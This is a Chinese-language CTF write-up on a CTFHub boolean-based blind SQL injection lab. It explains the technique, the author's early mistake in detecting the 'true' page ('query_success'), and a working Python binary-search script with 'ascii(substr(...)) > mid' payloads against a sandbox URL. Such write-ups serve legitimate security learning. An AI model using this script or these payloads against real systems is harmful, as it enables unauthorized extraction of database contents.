SQL布尔盲注 - CTFHub Web 入门 Writeup

2026年9月17日 CTFHub Web安全 SQL注入 布尔盲注

这是我做过最折磨的 SQL 注入题。没有回显位，也没有报错信息，页面只给你返回“真”或“假”。这篇 Writeup 记录了我从“判断逻辑完全写错，跑出长度为0”到“发现 query_success 暗号，最终用二分查找秒杀”的完整心路历程。

一、大白话解释：什么是布尔盲注？

比喻： 你面对一个只点头（真）或摇头（假）的傻子。你问：“数据库名字的第一个字母是 's' 吗？” 傻子点头；你问：“是 'a' 吗？” 傻子摇头。你只能通过问无数个“是或否”的问题，一点点拼凑出完整的答案。

与爆破的区别： 密码爆破是“试”，拿着字典挨个试；布尔盲注是“算”，利用逻辑推理，通过二分查找，一步步逼近真实数据。

二、踩坑全记录：为什么我的脚本一开始总是失败？

1. 错误的判断条件

一开始，我用 if "ctfhub" in r.text 来判断“真”。结果脚本跑出“数据库长度为 0”。

原因分析： 这道题成功时，页面根本不回显 ctfhub！它只显示一个极其隐蔽的词。

破局： 我手动在浏览器输入 1 and length(database())=4，发现页面显示 query_success。这就是这道题的“真”！

2. 从遍历升级为二分查找

旧代码猜一个字符要遍历 32-127 的 ASCII 码，最多 95 次请求。新代码引入二分查找（ascii > mid），最多只需要 7 次请求就能猜出一个字符，速度提升十几倍！

三、最终 Python 脚本（二分查找法）

import requests

url = "http://challenge-xxx.sandbox.ctfhub.com:10800/"

def is_true(payload):
    r = requests.get(url + "?id=" + payload, timeout=3)
    # 关键：使用页面中真实的“真”特征
    return "query_success" in r.text

def binary_search_char(prefix_payload, position):
    left, right = 32, 127
    while left <= right:
        mid = (left + right) // 2
        payload = f"1 and ascii(substr(({prefix_payload}), {position}, 1)) > {mid}"
        if is_true(payload):
            left = mid + 1
        else:
            right = mid - 1
    return chr(left)

四、核心总结与反思

💡 布尔盲注的核心是“判据”： 找不到正确的判据（比如这次的 query_success），脚本就会变成瞎子。实战中要善于用肉眼去对比“真”和“假”状态下页面的细微差异。

💡 算法优化至关重要： 遍历（for j in range）与二分查找（> mid）在请求量上是数量级的差距。写脚本不能只求“能跑”，还要求“跑得快”。

💡 心态锻炼： 经历了从报错、误判、调整、再跑的全过程。这就是安全工程师的日常：在黑暗中摸索，用逻辑点亮出路。
